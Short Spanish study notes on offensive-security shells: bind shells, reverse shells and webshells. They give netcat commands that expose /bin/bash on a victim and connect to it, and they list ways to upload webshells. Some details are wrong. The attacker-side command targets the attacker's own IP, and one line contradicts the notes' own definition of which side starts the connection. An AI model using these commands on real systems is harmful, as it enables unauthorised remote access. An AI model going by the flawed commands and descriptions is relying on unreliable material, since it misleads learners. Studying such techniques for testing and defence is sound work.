Parte de [[Explotación]]

En temas de seguridad ofensiva, se contemplan dos tipos de Shell:
- Bind Shell: El atacante inicia la conexion
- Reverse Shell: La victima inicia la conexion

(Ver adquisicion de shells con distintos metodos: InternalAllTheThings)

---
## Bind shell con netcat:

El servidor esta escuchando, el servidor inicia la conexion.

En la victima: 

``` bash
nc -nlvp [puerto] -e /bin/bash
```

En el equipo atacante:

``` bash
nc -nv [ipAtacante] [puerto]
```

---
## Reverse shells con netcat:

Especialmente util ya que la mayoria de bind shells no funcionara por los firewalls. Consiste en iniciar la escucha en la maquina y crear la peticion de conexion desde la victima.

---
## WebShells

Una linea de comandos escrita en un lenguaje de programacion concreto e interpretado por un servidor web.

Se pueden subir mediante FTP, formularios, el metodo PUT de HTTP ...

